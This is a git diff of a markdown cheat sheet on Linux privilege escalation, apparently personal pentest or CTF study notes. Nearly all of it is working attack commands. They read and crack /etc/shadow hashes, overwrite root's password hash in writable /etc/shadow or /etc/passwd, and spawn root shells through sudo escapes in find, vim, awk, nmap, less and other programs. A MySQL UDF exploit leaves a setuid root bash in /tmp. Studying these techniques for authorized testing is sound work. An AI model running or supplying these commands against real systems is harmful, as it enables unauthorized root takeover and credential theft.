@@ -1,4 +1,138 @@
 # Linux Privlage Escalation
+### Basic Enumeration
+````
+whoami
+pwd
+id
+````
+- OS, Kernel & Hostname
+````
+cat /etc/issue 
+cat /proc/version 
+hostname 
+uname -a
+searchsploit linux kernel 3.9
+````
+- To remove DoS exploits by adding -exclude=”/dos/”
+### Weak File Permissions - Readable /etc/shadow
+```
+ls -l /etc/shadow
+cat /etc/shadow
+```
+- A users password hash (if they have one) can be found between the first and second (:) of each line.
+- Save the root user's hash to a file called hash.txt on your kali machine and use john to crack it.
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+- Switch to the root user
+```
+su root
+```
+### Weak File Permissions - Writeable /etc/shadow
+```
+ls -l /etc/shadow
+```
+- Generate a new password hash
+```
+mkpasswd -m sha-512 jackiscool
+```
+- Edit /etc/shadow and replace origional root user's password hash with the one that you just created
+- Switch to the root user
+```
+su root
+```
+### Weak File Permissions - Writable /etc/passwd
+- The /etc/passwd file contained user password hashes, and some versions of Linux still allow password hashes to be stored there
+- The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. 
+````
+ls -l /etc/passwd
+````
+- Generate a new password hash with a password of your choice:
+````
+openssl passwd newpasswordhere
+````
+- Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
+- Switch to the root user, using the new password:
+````
+su root
+````
+- Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").
+- Now switch to the newroot user, using the new password:
+````
+su newroot
+````
+### Sudo-Shell escape Sequences
+- List the programs which sudo allows your user to run:
+````
+sudo -l
+````
+Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
+- SUID
+````
+Sudo -l
+````
+- iftop
+````
+sudo /usr/bin/iftop
+!/bin/bash #hit enter
+````
+- find
+````
+sudo /usr/bin/find . -exec /bin/bash \; -quit
+````
+- nano
+````
+sudo /usr/bin/nano
+Press ctrl+r then ctrl +x 
+Reset; bash 1>&0 2>&0
+````
+- vim
+````
+Sudo vim -c ‘:!/bin/bash’
+````
+- man
+````
+sudo /usr/bin/man man
+!/bin/sh
+````
+- awk
+````
+sudo awk 'BEGIN {system("/bin/bash")}'
+````
+- less
+````
+sudo /usr/bin/less /etc/profile
+!/bin/sh
+````
+- FTP
+````
+sudo /usr/bin/ftp
+!/bin/bash
+````
+- NMAP
+- Method 1
+````
+TF=$(mktemp)
+echo 'os.execute("/bin/bash")' > $TF
+sudo nmap --script=$TF
+````
+- Method 2
+````
+sudo nmap --interactive
+!bash
+````
+- more
+````
+TERM= sudo -E more /etc/profile
+!/bin/bash
+````
+
+
+
+
+
+
+
 ### Service Exploits
 - https://www.exploit-db.com/exploits/1518
 - The mysql service is running as root and the 'root' user for the service does not have a password assigned or the password is known. This exploit takes advantage of the User Defined Functions (UFDs) to run system commands as root via the mysql service.
@@ -33,37 +167,6 @@ select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
 ```
 - Run /tmp/rootbash with -p to gain a root shell
 `/tmp/rootbash -p`
-
-### Weak File Permissions - Readable /etc/shadow
-```
-ls -l /etc/shadow
-cat /etc/shadow
-```
-- A users password hash (if they have one) can be found between the first and second (:) of each line.
-- Save the root user's hash to a file called hash.txt on your kali machine and use john to crack it.
-```
-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-```
-- Switch to the root user
-```
-su root
-```
-### Weak File Permissions - Writeable /etc/shadow
-```
-ls -l /etc/shadow
-```
-- Generate a new password hash
-```
-mkpasswd -m sha-512 jackiscool
-```
-- Edit /etc/shadow and replace origional root user's password hash with the one that you just created
-- Switch to the root user
-```
-su root
-```
-### Weak File Permissions - Writable /etc/passwd
-- The /etc/passwd file contained user password hashes, and some versions of Linux still allow password hashes to be stored there
-- 
 ### Docker Linux Local PE
 ```
 id
